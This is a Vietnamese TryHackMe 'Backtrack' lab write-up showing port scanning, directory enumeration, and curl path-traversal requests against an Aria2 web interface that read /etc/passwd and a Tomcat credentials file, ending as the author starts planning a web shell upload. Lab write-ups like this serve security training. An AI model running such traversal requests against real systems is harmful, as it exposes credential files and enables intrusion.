# Backtrack-TryHackMe

recon 

└─$ rustscan -a 10.201.13.188 -- -sV -sC

<img width="596" height="309" alt="image" src="https://github.com/user-attachments/assets/0e7672e7-4c59-4c78-a9f4-ad0ebd1ad2b1" />

cổng 22, 6800, 8080, 8888 mở

tiến hành kiểm tra các port 

port 8080

<img width="1287" height="764" alt="image" src="https://github.com/user-attachments/assets/3de6633e-ee0d-4376-b39a-feab7ebdbc1e" />

port 8888

<img width="1280" height="766" alt="image" src="https://github.com/user-attachments/assets/687bd906-5ae8-4c9a-91bf-7dccc75cbfda" />


enumerating

└─$ gobuster dir -u http://10.201.13.188:8080/ -w /usr/share/wordlists/dirb/common.txt

<img width="774" height="425" alt="image" src="https://github.com/user-attachments/assets/4b9be8e9-cf71-4d91-aa52-2da5851ecabe" />

└─$ gobuster dir -u http://10.201.13.188:8888/ -w /usr/share/wordlists/dirb/common.txt

<img width="734" height="358" alt="image" src="https://github.com/user-attachments/assets/f247c824-7995-4b28-a71c-d9e951279d2c" />

Settings -> Server info

<img width="1246" height="741" alt="image" src="https://github.com/user-attachments/assets/f2d160c1-a741-40ed-8ac9-5c598f89e308" />

từ đây tôi xác định được CVE-2023-39141 từ Aria2 Version 1.35.0 

PoC : https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e

curl --path-as-is 'http://10.201.53.34:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd'

<img width="1085" height="651" alt="image" src="https://github.com/user-attachments/assets/0f2cc010-ea23-4eae-a7bf-0ebfbe95bd20" />

thư mục gốc của user tomcat là /opt/tomcat và dựa vào thông báo từ http://10.201.53.34:8080/host-manager/html

ta có thể đọc thông tin đăng nhập 

curl --path-as-is 'http://10.201.53.34:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml'

<img width="1225" height="221" alt="image" src="https://github.com/user-attachments/assets/eb3e0fd7-91ef-4e75-969e-53f9fa415d4b" />

username="tomcat" password="OPx52k53D8OkTZpx4fr"

dường như nó chưa có tác dụng khi mà tôi thử đăng nhập trên web lẫn ssh 

tôi bắt đầu tìm cách đẩy shell vào web 

